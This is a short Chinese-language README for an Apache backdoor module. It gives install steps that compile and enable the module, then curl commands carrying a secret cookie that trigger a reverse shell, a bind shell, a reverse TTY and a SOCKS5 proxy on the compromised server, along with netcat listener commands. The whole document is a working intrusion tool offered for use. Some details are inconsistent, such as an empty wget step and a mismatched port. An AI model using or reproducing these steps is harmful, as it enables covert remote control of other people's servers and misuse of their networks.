# Apache backdoor
### 安装
1. wget 
2. sudo apxs -i -a -c mod_image.c sblist.c sblist_delete.c server.c -Wl,-lutil
3. sudo a2enmod image
4. sudo systemctl restart apache2
5. 无命令apxs需要安装 sudo apt-get install apache2-dev
### 利用
nc监听
 nc -lvp 1337
vps执行
反向shell
curl -H 'Cookie: Hm_lpvt_8b02a318fde5831da10426656a43d0=1578566297' http://127.0.0.1/redirect/127.0.0.1/1337/bash

正向
curl -H 'Cookie: Hm_lpvt_8b02a318fde5831da10426656a43d0=1578566297' http://127.0.0.1/bind/1337
nc 127.0.0.1 1331

反向TTY
curl -H 'Cookie: Hm_lpvt_8b02a318fde5831da10426656a43d0=1578566297' http://127.0.0.1/revtty/127.0.0.1/1337

Socket5
1. curl -H 'Cookie: Hm_lpvt_8b02a318fde5831da10426656a43d0=1578566297' http://172.16.145.153/proxy/1337/vlad
2. curl -x socks5://vlad:Hm_lpvt_8b02a318fde5831da10426656a43d0=1578566297@<172.16.145.153>:1337 https://www.google.com
3. 代理取消echo "imdonewithyou" | nc 172.16.145.153 1337
